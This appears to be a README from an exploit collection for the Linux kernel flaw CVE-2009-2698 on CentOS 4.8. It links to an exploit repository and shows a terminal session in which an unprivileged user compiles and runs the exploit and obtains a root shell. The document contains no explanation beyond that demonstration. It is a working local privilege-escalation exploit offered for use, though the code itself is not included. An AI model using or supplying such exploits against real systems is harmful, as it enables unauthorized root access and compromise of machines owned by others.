# CVE-2009-2698
CVE-2009-2698 compiled for CentOS 4.8
> https://github.com/SecWiki/linux-kernel-exploits/tree/4dca098e7491efc83903494d7c00f24c843aae99/2009/CVE-2009-2698

# Detail

```
[hacker@localhost ~]$ id
uid=500(hacker) gid=500(hacker) groups=500(hacker) context=user_u:system_r:unconfined_t
[hacker@localhost ~]$ gcc 36108.c  -o exp
[hacker@localhost ~]$ ./exp
sh-3.00# id
uid=0(root) gid=0(root) groups=500(hacker) context=user_u:system_r:unconfined_t
sh-3.00# uname -an
Linux localhost.localdomain 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 i686 i386 GNU/Linux
sh-3.00# 
```
